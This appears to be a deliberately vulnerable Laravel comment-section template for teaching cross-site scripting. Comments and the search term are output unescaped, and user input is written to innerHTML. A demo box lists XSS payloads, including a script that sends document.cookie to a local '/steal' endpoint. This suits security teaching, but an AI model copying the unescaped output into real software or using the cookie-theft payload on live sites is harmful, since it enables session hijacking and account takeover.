<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comment Section - XSS Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            padding: 0;
            background-color: #f4f4f9;
        }
        h1, h2 {
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        .form-group {
            margin-bottom: 15px;
        }
        textarea, input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background: #007bff;
            color: #fff;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button.delete-btn {
            background: #dc3545;
        }
        button.preview-btn {
            background: #17a2b8;
        }
        button:hover {
            background: #0056b3;
        }
        button.delete-btn:hover {
            background: #c82333;
        }
        button.preview-btn:hover {
            background: #138496;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        ul li {
            background: #f9f9f9;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            position: relative;
        }
        ul li .delete-btn {
            position: absolute;
            top: 10px;
            right: 10px;
        }
        .xss-demo {
            margin-top: 40px;
            padding: 20px;
            background: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
        }
        .xss-demo pre {
            background: #f8f9fa;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            overflow: auto;
        }
        .warning {
            color: red;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Comment Section</h1>
        
        <!-- Search Bar -->
        <h2>Search Comments:</h2>
        <form action="{{ route('comments.index') }}" method="GET">
            <div class="form-group">
                 <input type="text" name="search" placeholder="Search..." value="{{ request()->get('search') }}">
               <!--<input type="text" name="search" placeholder="Search..." value="{!! request()->get('search') !!}">-->
            </div>
            <button type="submit">Search</button>

        </form>

        <!-- Add Comment -->
        <h2>Post a Comment (with script support)</h2>

        @if (session('success'))
            <p style="color: green;">{{ session('success') }}</p>
        @endif

        <form action="{{ route('comments.storename') }}" method="POST">
            @csrf
            <div class="form-group">
                <textarea name="name" rows="5" placeholder="Write your username"></textarea>
            </div>
            <button type="button" class="preview-btn" onclick="confirmname()">Confirm</button>
        </form>
        
        <!-- Confirm Section -->
        <h2>Confirm section:</h2>
        <div id="confirm" style="border: 1px solid #ddd; padding: 10px; background: #f9f9f9; border-radius: 4px;"></div>


        <form action="{{ route('comments.store') }}" method="POST">
            @csrf
            <div class="form-group">
                <textarea name="content" rows="5" placeholder="Write your comment here"></textarea>
            </div>
            <button type="submit">Post Comment</button>
            <button type="button" class="preview-btn" onclick="previewComment()">Preview</button>
        </form>

        <!-- Preview Section -->
        <h2>Preview:</h2>
        <div id="preview" style="border: 1px solid #ddd; padding: 10px; background: #f9f9f9; border-radius: 4px;"></div>

        <!-- List Comments -->
        <h2>Comments:</h2>
       
        <?php 
         //$search = strip_tags($_GET['search'] ?? ''); // Remove tags
         //$search = htmlspecialchars(($_GET['search'] ?? ''), ENT_QUOTES, 'UTF-8'); // Remove tags
         $search = ($_GET['search'] ?? ''); //  Vulnérabilité XSS ici
        
        echo "<pre>Results for : $search </pre>"; ?>

        <ul>
            @foreach ($comments as $comment)
                <li>
                    {!! $comment->content !!} <!-- Vulnérabilité XSS ici -->
                     <!--{{ $comment->content }} Correction XSS ici -->
                    
                    <form action="{{ route('comments.destroy', $comment->id) }}" method="POST" style="display:inline;">
                        @csrf
                        @method('DELETE')
                        <button type="submit" class="delete-btn">Delete</button>
                    </form>
                </li>
            @endforeach
        </ul>

        <!-- XSS Demo Section -->
        <div class="xss-demo">
            <h2>Test XSS Vulnerabilities</h2>
            <p>Use the following examples to test XSS vulnerabilities in the comment section:</p>
            <ul>
                <li><strong>Basic XSS:</strong></li>
                <pre>&lt;script&gt;alert('XSS Test')&lt;/script&gt;</pre>
                
                <li><strong>Stealing Cookies:</strong></li>
                <pre>&lt;script&gt;fetch('http://127.0.0.1:8080/steal?cookie=' + encodeURIComponent(document.cookie);&lt;/script&gt;
                </pre>

                <li><strong>Defacement:</strong></li>
                <pre>&lt;h1 style="color:red;"&gt;Hacked!&lt;/h1&gt;</pre>

                <li><strong>Malicious Redirect:</strong></li>
                <pre>&lt;script&gt;window.location.href='https:google.com'&lt;/script&gt;</pre>
            </ul>
            <p><strong>Note:</strong> These examples are for educational purposes only. Ensure you sanitize inputs to prevent exploitation.</p>
        </div>
    </div>

  
    <script>
        function previewComment() {
            const content = document.querySelector('textarea[name="content"]').value;
            const previewDiv = document.getElementById('preview');
            previewDiv.innerHTML = content;

            if (content.includes("<script>")) {
                previewDiv.innerHTML += "<p class='warning'>Warning: Scripts detected! Sanitize this input.</p>";
            }
        }

        function confirmname() {
            const name = document.querySelector('textarea[name="name"]').value;
            const previewDiv = document.getElementById('confirm');
            previewDiv.innerHTML = `Your name: ${name}`;
        }

        /*
        function confirmname() {
        var name = document.querySelector('textarea[name="name"]').value;
        if (name.trim() === '') {
            alert('Please enter a name.');
            return;
        }

        // If the user confirms, submit the form
        if (confirm('Are you sure you want to submit this name?')) {
            document.getElementById('name-form').submit();
        }
    }
        
         
       
        function confirmname() {
            const name = document.querySelector('textarea[name="name"]').value;
            const previewDiv = document.getElementById('confirm');
            previewDiv.textContent = `Your name: ${name}`;
        }*/


    </script>
</body>
</html>
